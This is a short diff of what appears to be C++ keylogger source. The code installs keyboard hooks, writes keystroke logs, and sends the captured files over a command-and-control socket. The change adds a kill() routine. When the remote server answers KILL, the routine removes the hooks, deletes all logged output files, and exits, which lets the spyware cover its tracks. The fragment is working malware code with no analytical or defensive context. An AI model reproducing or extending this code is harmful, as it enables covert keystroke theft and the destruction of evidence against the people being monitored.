@@ -26,6 +26,18 @@
 #include <filesystem>
 #include <algorithm>
 
+void kill()
+{
+	KeyboardManager::GetInstance().UninstallHooks();
+	
+	for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
+	{
+		std::filesystem::remove(entry.path());
+	}
+
+	exit(0);
+}
+
 // LogTimer Handler function
 void WriteKeylog()
 {
@@ -80,9 +92,7 @@ void DumpCache()
 			RESPONSE_CODE res = ccSocket.SendFile(path);
 			if (res == KILL)
 			{
-				KeyboardManager::GetInstance().UninstallHooks();
-				// TODO delete all files
-				exit(0);
+				kill();
 			}
 			else if (res == SUCCESS)
 			{
